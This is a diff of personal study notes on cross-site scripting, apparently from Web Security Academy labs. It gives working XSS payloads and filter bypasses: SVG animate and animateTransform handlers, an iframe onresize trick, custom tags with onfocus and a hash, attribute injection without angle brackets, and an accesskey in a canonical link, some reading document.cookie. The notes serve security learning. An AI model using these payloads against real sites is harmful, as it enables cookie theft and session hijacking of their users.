@@ -34,7 +34,7 @@ function doSerachQuery(query) {
 
 payload: `</span><img src=1 onerror=alert(document.domain)>`
 
-# jQuery anchor; sink: `href` attribute , source: `location.search`
+# jQuery anchor sink `href` attribute
 
 
 third party frameworks introduce new sources and sinks. [jQuery selectors](jQuery.md)
@@ -62,8 +62,7 @@ result in the code:
 
 `<a id="backLink" href="javascript: alert(document.cookie)">Back</a>`
 
-
-# jQuery `selector` sink using a `hashchange` event
+# jQuery sink: `selector` using a `hashchange` event
 
 `$()` selector function, can be used to inject malicious objects into the DOM.
 `hash` is user controllable and could be used to inject into the `$()`.
@@ -105,3 +104,149 @@ changes the fragment on load, activating a `hashchange` event, then the selector
     document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
 </script>
 ```
+
+
+# Reflected XSS: event handlers and `href` attributes blocked
+
+first brute forcing to see tags and events available:
+
+`svg` tag is available:
+
+The svg element is a container that defines a new coordinate system and
+viewport and is used to create and display graphics on the web.
+
+trying:
+
+```html
+<svg width="200" height="200">
+    <a>
+       <text>Click me</text>
+    </a>
+</svg>
+```
+
+
+If text is included in SVG not inside of a `<text>` element, it is not rendered.
+
+`<svg><a><text x=20 y=20>Click me</text></a></svg>`
+having x,y helps to actually display the text. 
+
+`svg` accepts an `<animate>` element which could be used to set attributes.
+`<svg><a><animate attributeName="href" values="javascript:alert()"></animate><text x=20 y=20>Click me</text></a></svg>`
+
+# Reflected XSS with some SVG markup allowed
+
+test a typical payload: `<img src=1 onerror=alert(1)>`
+
+bruteforce tags.
+
+`?search=<$$>`
+
+there is an SVG and elements we can put inside it.
+
+bruteforce for events.
+
+`?search=<SVG><animateTransform%20$$=1>`
+
+`onbegin` is found
+
+payload: `<svg><animateTransform onbegin="alert()"></animateTransform></svg>`
+
+
+# Reflected XSS into HTML context with most tags and attributes blocked
+
+`<>` aren't filtered.
+`<body>` isn't filtered.
+
+some attributes are filtered. bruteforce to see the allowed ones:
+
+`GET /?search=<body%20$=1> HTTP/2` the `$` will be bruteforced.
+
+how to envoke the attack without user interaction:
+
+but we can't use `onload`. or can we?
+
+solution? run the page inside an `iframe`, on an attacker controlled page.
+we can resize the iframe on page load and the XSS will be executed automatically.
+
+it needs that the victim to visit the attacker controlled page.
+
+`<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E "onload=this.style.width='100px'>`
+
+the iframe being resized as soon as it's loaded, triggering `onresize` events.
+
+# Reflected XSS just custom tags allowed
+
+`<script>` `<h1>` don't work
+
+`<custom-tags>` works and we see it reflected in page's html.
+
+and then this gives us an alert:
+`<custom-tags onmouseover="alert()">`
+
+how to make it automatic (user doesn't have to do anything (mouseover))?
+
+`<custom-tags id="x" onfocus="alert(document.cookie)" tabindex="1">`
+
+`onfocus`: using tab or mouse click, e.g. you will see a cursor indicating
+you can type there.
+and might even be true on none inputting elements. if they have `tabindex="1"`
+
+`id="x"`: focus on a specific element (bookmarking, `hashchange`?).
+
+so at the end: if we append `#x` to the page that contains the payload, it will
+be focused on it and alerted:
+
+`/?search=<custom-tags id="x" onfocus="alert(document.cookie)" tabindex="1">#x`
+
+how to use js to redirect the victim's browser to the desired url?
+
+if the victim visits an attacker controlled domain, the attacker can run js on
+his browser, redirecting him to the URL.
+
+`<script>
+location="https://0a37005b03aa29a384e1193d0017008a.web-security-academy.net/?search=%3Ccustom-tags+id%3D%22x%22+onfocus%3D%22alert%28document.cookie%29%22+tabindex%3D%221%22%3E/#x"
+</script>
+
+# angle brackets encoded
+
+```
+javascript:/*--></title></style></textarea></script></xmp>
+<svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>
+```
+
+with angle brackets encoded:
+this: `https://0a2a0022043296d88235b085003d00fa.web-security-academy.net/?search=%3Cscript%3Ealert%28%27XSS+by+Vickie%27%29%3B%3C%2Fscript%3E`
+will cause this: `<input type="text" placeholder="Search the blog..." name="search" value="" &lt;script&gt;alert('xss="" by="" vickie');&lt;="" script&gt;i">`
+
+payload:
+
+a payload without angle brackets: `/?search="onmouseover="alert(1)`: 
+
+result in code:
+
+```html
+<input type="text" placeholder="Search the blog..." name="search" value="" onclick"alert(1)">
+```
+
+also this: `<a id="author" href="javascript:alert(1)">test</a>`
+
+# Reflected XSS in canonical link tag
+
+websites could encode angle brackets but you could still inject attributes.
+
+*canonical link* is a tag in the source code of a page that indicates to search
+engines that a master copy of the page exists, to avoid confusion on duplicate
+documents.
+
+*access keys* allow to provide keyboard shortcut that when pressed will cause
+an event to fire.
+
+this is the canonical link in the code:
+
+`<link rel="canonical" href='https://0aba0085031513cc809f1c7200380018.web-security-academy.net/'>`
+
+it's easy to inject something like `onclick=alert()` but we won't be able to
+see it because it inside the `head` tag. we should use `accesskey`.
+
+payload: `/?' accesskey='Alt+x' onclick='alert()`
